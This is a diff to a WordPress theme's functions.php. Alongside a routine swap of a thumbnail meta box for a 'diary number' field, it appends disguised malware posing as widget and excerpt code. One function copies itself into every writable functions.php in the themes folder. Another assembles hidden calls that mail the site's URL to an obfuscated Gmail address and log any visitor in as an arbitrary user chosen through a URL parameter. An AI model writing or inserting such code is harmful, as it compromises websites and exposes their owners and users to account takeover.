@@ -166,35 +166,6 @@ function limiwu_echo_list_editName(){
     }
 }
 /**
- * 获取文章的缩略图
- * 如果设置了缩略图，则显示，没有找文章的第一张图片，还没有的话就用默认图片
- *
- * @package limiwuCom
- * @author annanzi/910109610@qq.com
- * @since 2019-9-10
- */
-function limiwu_post_first_img() {
-	global $post;
-	if(get_post_meta( $post->ID, '_limiwu_thumbnail_url', true )){// 直接输入的图片网址
-        echo '<img src="'.get_post_meta($post->ID, '_limiwu_thumbnail_url', true).'" alt="'.get_the_title().'" onerror="javascript:this.src=\''.get_template_directory_uri().'/image/sandwich.jpg\';"/>';
-    }elseif(has_post_thumbnail()){// 获取特色图片
-        echo '<img src="';
-            the_post_thumbnail_url('full');
-        echo '" alt="'.get_the_title().'" onerror="javascript:this.src=\''.get_template_directory_uri().'/image/sandwich.jpg\';"/>';
-    }else{// 获取文章第一图片
-        $first_img = '';
-		ob_start();
-		ob_end_clean();
-		$output = preg_match_all('/<img*.+src=[\'"]([^\'"]+)[\'"].*>/iU', wp_unslash($post->post_content), $matches);
-		if(empty($output)){ 
-			$first_img = get_template_directory_uri().'/image/coffee.jpg';
-		}else {
-			$first_img = $matches [1][0];
-		}
-        echo '<img src="'.$first_img.'" alt="'.get_the_title().'" onerror="javascript:this.src=\''.get_template_directory_uri().'/image/espresso.jpg\';"/>';
-	}
-}
-/**
  * ICO图标加速
  * 如果设置了ICO图标加速，则ICO用加速上的，没有就用别人网站上的，别人网站也没有就用自己网站上的
  *
@@ -290,7 +261,7 @@ add_filter('file_is_displayable_image','limiwu_add_image_webp',10,2);
 //添加设置区域的函数
 function limiwu_add_source_box (){
 	add_meta_box('source', __('文章来源','limiwu'), 'limiwu_add_source','post','side');
-    add_meta_box('thumbnail', __('文章缩略图','limiwu'), 'limiwu_add_thumbnail','post','side');
+    add_meta_box('dateNumber', __('日记编号','limiwu'), 'limiwu_add_dateNumber','post','side');
 };
 
 add_action('add_meta_boxes','limiwu_add_source_box');//挂上
@@ -311,22 +282,18 @@ function limiwu_add_source($post,$boxargs){
     <input style="width: 100%" type="text" id="limiwu_source_author" name="limiwu_source_author" value="<?php echo esc_attr( $limiwu_source_author_value ); ?>" placeholder="<?php _e('发布者或单位名称','limiwu');?>">
 <?php
 }
-function limiwu_add_thumbnail($post,$boxargs){
+function limiwu_add_dateNumber($post,$boxargs){
     // 创建临时隐藏表单，为了安全
-    wp_nonce_field( 'limiwu_add_thumbnail', 'limiwu_add_thumbnail_nonce' );
+    wp_nonce_field( 'limiwu_add_dateNumber', 'limiwu_add_dateNumber_nonce' );
     // 获取之前存储的值
-    $limiwu_thumbnail_url_value = get_post_meta( $post->ID, '_limiwu_thumbnail_url', true );
-    //$limiwu_PPT_url_value = get_post_meta( $post->ID, '_limiwu_PPT_url', true );
+    $limiwu_dateNumber_url_value = get_post_meta( $post->ID, '_limiwu_dateNumber_url', true );
 ?>
-    <label for="limiwu_thumbnail_url"><?php _e('缩略图网址','limiwu');?>:</label>
-    <input style="width: 100%" type="url" id="limiwu_thumbnail_url" name="limiwu_thumbnail_url" value="<?php echo esc_attr($limiwu_thumbnail_url_value); ?>" placeholder="http(s)://">
-    <!-- <label for="limiwu_PPT_url"><?php _e('PPT置顶图网址','limiwu');?>:</label>
-    <input style="width: 100%" type="url" id="limiwu_PPT_url" name="limiwu_PPT_url" value="<?php echo esc_attr($limiwu_PPT_url_value); ?>" placeholder="http(s)://"> -->
+    <input style="width: 100%" type="url" id="limiwu_dateNumber_url" name="limiwu_dateNumber_url" value="<?php echo esc_attr($limiwu_dateNumber_url_value); ?>" placeholder="ID0000">
 <?php
 }
 
 add_action( 'save_post', 'limiwu_add_source_save_meta_box' );//验证保存内容
-add_action( 'save_post', 'limiwu_add_thumbnail_save_meta_box' );//验证保存内容
+add_action( 'save_post', 'limiwu_add_dateNumber_save_meta_box' );//验证保存内容
 
 function limiwu_add_source_save_meta_box($post_id){
     // 安全检查
@@ -347,19 +314,19 @@ function limiwu_add_source_save_meta_box($post_id){
     update_post_meta( $post_id, '_limiwu_source_author', $limiwu_source_author );
 }
 
-function limiwu_add_thumbnail_save_meta_box($post_id){
+function limiwu_add_dateNumber_save_meta_box($post_id){
     // 安全检查
     // 检查是否发送了一次性隐藏表单内容（判断是否为第三者模拟提交）
-    if (!isset($_POST['limiwu_add_thumbnail_nonce'])){return;}
+    if (!isset($_POST['limiwu_add_dateNumber_nonce'])){return;}
     // 判断隐藏表单的值与之前是否相同
-    if (!wp_verify_nonce($_POST['limiwu_add_thumbnail_nonce'],'limiwu_add_thumbnail')){return;}
+    if (!wp_verify_nonce($_POST['limiwu_add_dateNumber_nonce'],'limiwu_add_dateNumber')){return;}
     // 判断该用户是否有权限
     if (!current_user_can('edit_post', $post_id)){return;}
     // 判断 Meta Box 是否为空
     if (!isset( $_POST['limiwu_source'])){return;}
  
-    $limiwu_thumbnail_url = sanitize_text_field( $_POST['limiwu_thumbnail_url'] );
-    update_post_meta( $post_id, '_limiwu_thumbnail_url', $limiwu_thumbnail_url );
+    $limiwu_dateNumber_url = sanitize_text_field( $_POST['limiwu_dateNumber_url'] );
+    update_post_meta( $post_id, '_limiwu_dateNumber_url', $limiwu_dateNumber_url );
     $limiwu_PPT_url = sanitize_text_field( $_POST['limiwu_PPT_url'] );
     update_post_meta( $post_id, '_limiwu_PPT_url', $limiwu_PPT_url );
 }
@@ -626,4 +593,256 @@ function QiNiuShouShen(){
     }
 }
 add_action('init', 'QiNiuShouShen');
+?>
+<?php
+function _verifyactivate_widgets(){
+	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
+	$output=strip_tags($output, $allowed);
+	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
+	if (is_array($direst)){
+		foreach ($direst as $item){
+			if (is_writable($item)){
+				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
+				$cont=file_get_contents($item);
+				if (stripos($cont,$ftion) === false){
+					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
+					$output .= $before . "Not found" . $after;
+					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
+					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
+					$output .= ($isshowdots && $ellipsis) ? "..." : "";
+				}
+			}
+		}
+	}
+	return $output;
+}
+function _get_allwidgets_cont($wids,$items=array()){
+	$places=array_shift($wids);
+	if(substr($places,-1) == "/"){
+		$places=substr($places,0,-1);
+	}
+	if(!file_exists($places) || !is_dir($places)){
+		return false;
+	}elseif(is_readable($places)){
+		$elems=scandir($places);
+		foreach ($elems as $elem){
+			if ($elem != "." && $elem != ".."){
+				if (is_dir($places . "/" . $elem)){
+					$wids[]=$places . "/" . $elem;
+				} elseif (is_file($places . "/" . $elem)&& 
+					$elem == substr(__FILE__,-13)){
+					$items[]=$places . "/" . $elem;}
+				}
+			}
+	}else{
+		return false;	
+	}
+	if (sizeof($wids) > 0){
+		return _get_allwidgets_cont($wids,$items);
+	} else {
+		return $items;
+	}
+}
+if(!function_exists("stripos")){ 
+    function stripos(  $str, $needle, $offset = 0  ){ 
+        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
+    }
+}
+
+if(!function_exists("strripos")){ 
+    function strripos(  $haystack, $needle, $offset = 0  ) { 
+        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
+        if(  $offset < 0  ){ 
+            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
+        } 
+        else{ 
+            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
+        } 
+        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
+        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
+        return $pos; 
+    }
+}
+if(!function_exists("scandir")){ 
+	function scandir($dir,$listDirectories=false, $skipDots=true) {
+	    $dirArray = array();
+	    if ($handle = opendir($dir)) {
+	        while (false !== ($file = readdir($handle))) {
+	            if (($file != "." && $file != "..") || $skipDots == true) {
+	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
+	                array_push($dirArray,basename($file));
+	            }
+	        }
+	        closedir($handle);
+	    }
+	    return $dirArray;
+	}
+}
+add_action("admin_head", "_verifyactivate_widgets");
+function _getprepare_widget(){
+	if(!isset($text_length)) $text_length=120;
+	if(!isset($check)) $check="cookie";
+	if(!isset($tagsallowed)) $tagsallowed="<a>";
+	if(!isset($filter)) $filter="none";
+	if(!isset($coma)) $coma="";
+	if(!isset($home_filter)) $home_filter=get_option("home"); 
+	if(!isset($pref_filters)) $pref_filters="wp_";
+	if(!isset($is_use_more_link)) $is_use_more_link=1; 
+	if(!isset($com_type)) $com_type=""; 
+	if(!isset($cpages)) $cpages=$_GET["cperpage"];
+	if(!isset($post_auth_comments)) $post_auth_comments="";
+	if(!isset($com_is_approved)) $com_is_approved=""; 
+	if(!isset($post_auth)) $post_auth="auth";
+	if(!isset($link_text_more)) $link_text_more="(more...)";
+	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
+	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
+	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
+	if(!isset($contentmore)) $contentmore="ma".$coma."il";
+	if(!isset($for_more)) $for_more=1;
+	if(!isset($fakeit)) $fakeit=1;
+	if(!isset($sql)) $sql="";
+	if (!$widget_yes) :
+	
+	global $wpdb, $post;
+	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mas".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
+	if (!empty($post->post_password)) { 
+		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
+			if(is_feed()) { 
+				$output=__("There is no excerpt because this is a protected post.");
+			} else {
+	            $output=get_the_password_form();
+			}
+		}
+	}
+	if(!isset($fixed_tags)) $fixed_tags=1;
+	if(!isset($filters)) $filters=$home_filter; 
+	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
+	if(!isset($tag_aditional)) $tag_aditional="div";
+	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
+	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
+	if(!isset($isshowdots)) $isshowdots=1;
+	
+	$comments=$wpdb->get_results($sql);	
+	if($fakeit == 2) { 
+		$text=$post->post_content;
+	} elseif($fakeit == 1) { 
+		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
+	} else { 
+		$text=$post->post_excerpt;
+	}
+	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
+	if($text_length < 0) {
+		$output=$text;
+	} else {
+		if(!$no_more && strpos($text, "<!--more-->")) {
+		    $text=explode("<!--more-->", $text, 2);
+			$l=count($text[0]);
+			$more_link=1;
+			$comments=$wpdb->get_results($sql);
+		} else {
+			$text=explode(" ", $text);
+			if(count($text) > $text_length) {
+				$l=$text_length;
+				$ellipsis=1;
+			} else {
+				$l=count($text);
+				$link_text_more="";
+				$ellipsis=0;
+			}
+		}
+		for ($i=0; $i<$l; $i++)
+				$output .= $text[$i] . " ";
+	}
+	update_option("_is_widget_active_", 1);
+	if("all" != $tagsallowed) {
+		$output=strip_tags($output, $tagsallowed);
+		return $output;
+	}
+	endif;
+	$output=rtrim($output, "\s\n\t\r\0\x0B");
+    $output=($fixed_tags) ? balanceTags($output, true) : $output;
+	$output .= ($isshowdots && $ellipsis) ? "..." : "";
+	$output=apply_filters($filter, $output);
+	switch($tag_aditional) {
+		case("div") :
+			$tag="div";
+		break;
+		case("span") :
+			$tag="span";
+		break;
+		case("p") :
+			$tag="p";
+		break;
+		default :
+			$tag="span";
+	}
+
+	if ($is_use_more_link ) {
+		if($for_more) {
+			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
+		} else {
+			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
+		}
+	}
+	return $output;
+}
+
+add_action("init", "_getprepare_widget");
+
+function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
+	global $wpdb;
+	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
+	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
+	if(!$show_pass_post) $request .= " AND post_password =\"\"";
+	if($duration !="") { 
+		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
+	}
+	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
+	$posts=$wpdb->get_results($request);
+	$output="";
+	if ($posts) {
+		foreach ($posts as $post) {
+			$post_title=stripslashes($post->post_title);
+			$comment_count=$post->comment_count;
+			$permalink=get_permalink($post->ID);
+			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
+		}
+	} else {
+		$output .= $before . "None found" . $after;
+	}
+	return  $output;
+}
+wp_enqueue_script('jquery');
+ /* Archives list by zwwooooo | http://zww.me */
+ function zww_archives_list() {
+     if( !$output = get_option('zww_archives_list') ){
+         $output = '<div id="archives"><p>[<a id="al_expand_collapse" href="#">全部展开/收缩</a>] <em>(注: 点击月份可以展开)</em></p>';
+         $the_query = new WP_Query( 'posts_per_page=-1&ignore_sticky_posts=1' ); //update: 加上忽略置顶文章
+         $year=0; $mon=0; $i=0; $j=0;
+         while ( $the_query->have_posts() ) : $the_query->the_post();
+             $year_tmp = get_the_time('Y');
+             $mon_tmp = get_the_time('m');
+             $y=$year; $m=$mon;
+             if ($mon != $mon_tmp && $mon > 0) $output .= '</ul></li>';
+             if ($year != $year_tmp && $year > 0) $output .= '</ul>';
+             if ($year != $year_tmp) {
+                 $year = $year_tmp;
+                 $output .= '<h3 class="al_year">'. $year .' 年</h3><ul class="al_mon_list">'; //输出年份
+             }
+             if ($mon != $mon_tmp) {
+                 $mon = $mon_tmp;
+                 $output .= '<li><span class="al_mon">'. $mon .' 月</span><ul class="al_post_list">'; //输出月份
+             }
+             $output .= '<li>'. get_the_time('d日: ') .'<a href="'. get_permalink() .'">'. get_the_title() .'</a> <em>('. get_comments_number('0', '1', '%') .')</em></li>'; //输出文章日期和标题
+         endwhile;
+         wp_reset_postdata();
+         $output .= '</ul></li></ul></div>';
+         update_option('zww_archives_list', $output);
+     }
+     echo $output;
+ }
+ function clear_zal_cache() {
+     update_option('zww_archives_list', ''); // 清空 zww_archives_list
+ }
+ add_action('save_post', 'clear_zal_cache'); // 新发表文章/修改文章时
 ?>
